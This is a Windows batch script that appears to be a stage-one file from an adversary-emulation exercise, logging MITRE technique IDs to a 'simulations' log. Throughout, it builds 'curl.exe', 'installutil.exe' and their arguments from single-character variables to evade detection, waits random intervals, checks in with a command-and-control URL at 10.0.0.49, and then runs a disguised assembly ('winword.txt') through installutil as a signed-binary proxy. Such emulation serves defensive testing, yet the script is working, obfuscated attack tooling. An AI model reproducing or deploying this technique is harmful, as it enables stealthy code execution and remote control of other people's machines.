@echo off
SETLOCAL EnableDelayedExpansion

REM Random constant names with PHR_ as values
SET zxmqp=%APPDATA%\7993\e458d355
SET akjdh=https://10.0.0.49
SET rtyui=https://10.0.0.49/stage/2/icon.png?7993-7
SET plmko=ITZEL-S2BO
SET xcvbn=7
SET qazws=winword.txt
SET edcrf=7993

REM Setup logging directory
SET vfrtg=%APPDATA%\!xcvbn!
SET nhyuj=!vfrtg!\macula-simulations.log
IF NOT EXIST "!vfrtg!" MD "!vfrtg!" >nul 2>&1

echo [!DATE! !TIME!][DEBUG][!plmko!]: Initializing Stage1 DLL execution>>> "!nhyuj!" 2>nul

REM Initial delay 30-60s using timeout
SET /A idel=!RANDOM! %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!plmko!]: Initial delay start !idel!s>>> "!nhyuj!" 2>nul
timeout /t !idel! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!plmko!]: Initial delay complete>>> "!nhyuj!" 2>nul

REM Obfuscated curl command using multi-layer variable indirection
SET a0=c
SET a1=u
SET a2=r
SET a3=l
SET a4=.exe
SET curlpart1=!a0!!a1!!a2!!a3!!a4!
SET curlref1=curlpart1

REM Build curl executable reference with nested expansion
CALL SET curlpart2=%%!curlref1!%%
SET curlcmd=!curlpart2!

REM Obfuscated installutil command using array-style variables
SET b0=i
SET b1=n
SET b2=s
SET b3=t
SET b4=a
SET b5=l
SET b6=l
SET b7=u
SET b8=t
SET b9=i
SET b10=l
SET b11=.exe
SET instpart=!b0!!b1!!b2!!b3!!b4!!b5!!b6!!b7!!b8!!b9!!b10!!b11!
SET instref1=instpart

REM Build installutil reference with CALL expansion
CALL SET instcmd=%%!instref1!%%

REM Obfuscated arguments with multiple indirection layers
SET c0=/
SET c1=l
SET c2=o
SET c3=g
SET c4=f
SET c5=i
SET c6=l
SET c7=e
SET c8==
SET d0= /
SET d1=L
SET d2=o
SET d3=g
SET d4=T
SET d5=o
SET d6=C
SET d7=o
SET d8=n
SET d9=s
SET d10=o
SET d11=l
SET d12=e
SET d13==
SET d14=f
SET d15=a
SET d16=l
SET d17=s
SET d18=e
SET e0= /
SET e1=U
CALL SET arg1=%%c0%%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%
CALL SET arg2=%%d0%%d1%%d2%%d3%%d4%%d5%%d6%%d7%%d8%%d9%%d10%%d11%%d12%%d13%%d14%%d15%%d16%%d17%%d18%%
CALL SET arg3=%%e0%%e1%%
SET argfull=!arg1!!arg2!!arg3!

REM Pre-heartbeat delay 5-15s using ping
SET /A pdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!plmko!]: Pre-heartbeat delay !pdel!s>>> "!nhyuj!" 2>nul
ping -n !pdel! 127.0.0.1 >nul

REM C2 heartbeat check - CRITICAL FIXED IMPLEMENTATION
echo [!DATE! !TIME!][DEBUG][!plmko!]: Heartbeat check start>>> "!nhyuj!" 2>nul
SET hbresult=0
SET hberror=

REM Execute curl with proper URL and timeout parameters
!curlcmd! -k -s -o nul --connect-timeout 30 --max-time 60 "!rtyui!"
IF !ERRORLEVEL! EQU 0 (
    SET hbresult=1
) ELSE (
    SET hberror=connection_failed_!ERRORLEVEL!
)

REM Format timestamp for TTP logging (YYYY-MM-DD HH:MM:SS.SSS)
FOR /F "tokens=1-3 delims=/- " %%a IN ("!DATE!") DO (
    SET yyyy=%%c
    SET mm=%%a
    SET dd=%%b
)
SET mm=0!mm!
SET dd=0!dd!
SET yyyy=!yyyy!
SET mm=!mm:~-2!
SET dd=!dd:~-2!
SET hms=!TIME!
IF "!hms:~1,1!"==":" SET hms=0!hms!
SET hms=!hms:~0,2!:!hms:~3,2!:!hms:~6,2!.!hms:~9,2!0
SET fullts=!yyyy!-!mm!-!dd! !hms!

REM Log TTP T1105 heartbeat result
echo [!fullts!][!plmko!]: !xcvbn!-!edcrf!-T1105|Ingress Tool Transfer=!hbresult!:!hberror!>>> "!nhyuj!" 2>&1

IF !hbresult! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!plmko!]: Heartbeat failed, exiting>>> "!nhyuj!" 2>nul
    EXIT /B 1
)

echo [!DATE! !TIME!][DEBUG][!plmko!]: Heartbeat successful>>> "!nhyuj!" 2>nul

REM Random delay 5-15s using CHOICE
SET /A cdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!plmko!]: Pre-directory change delay !cdel!s>>> "!nhyuj!" 2>nul
CHOICE /C Y /N /D Y /T !cdel! >nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!plmko!]: Changing to directory !zxmqp!>>> "!nhyuj!" 2>nul
CD /D "!zxmqp!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!plmko!]: Directory change failed>>> "!nhyuj!" 2>nul
    SET execresult=0
    SET exerror=path_not_found
    GOTO :logexec
)

REM Random delay 10-30s using timeout
SET /A rdelay=!RANDOM! %% 21 + 10
echo [!DATE! !TIME!][DEBUG][!plmko!]: Random delay !rdelay!s before execution>>> "!nhyuj!" 2>nul
timeout /t !rdelay! /nobreak >nul

REM Execute DLL via installutil with full .NET Framework path
echo [!DATE! !TIME!][DEBUG][!plmko!]: Starting DLL execution>>> "!nhyuj!" 2>nul
SET execresult=0
SET exerror=

REM Build full path to installutil with indirection
SET netpart1=%WINDIR%
SET netpart2=\Microsoft.NET\Framework64\v4.0.30319\
SET netpath=!netpart1!!netpart2!
CALL SET instexe=%%instref1%%
SET fullinst=!netpath!!instexe!

REM Execute installutil with obfuscated arguments
echo [!DATE! !TIME!][DEBUG][!plmko!]: Executing: !fullinst! !argfull!"!qazws!" >>> "!nhyuj!" 2>nul
!fullinst! !argfull!"!qazws!"

IF !ERRORLEVEL! EQU 0 (
    SET execresult=1
) ELSE (
    SET exerror=assembly_load_failed_!ERRORLEVEL!
)

:logexec
REM Log TTP T1218 execution result
echo [!fullts!][!plmko!]: !xcvbn!-!edcrf!-T1218|Signed Binary Proxy Execution=!execresult!:!exerror!>>> "!nhyuj!" 2>&1

IF !execresult! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!plmko!]: DLL execution completed>>> "!nhyuj!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!plmko!]: DLL execution failed: !exerror!>>> "!nhyuj!" 2>nul
)

REM Final cleanup delay 5-15s using ping
SET /A fdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!plmko!]: Final cleanup delay !fdel!s>>> "!nhyuj!" 2>nul
ping -n !fdel! 127.0.0.1 >nul

echo [!DATE! !TIME!][DEBUG][!plmko!]: Stage1 complete>>> "!nhyuj!" 2>nul

ENDLOCAL
EXIT /B 0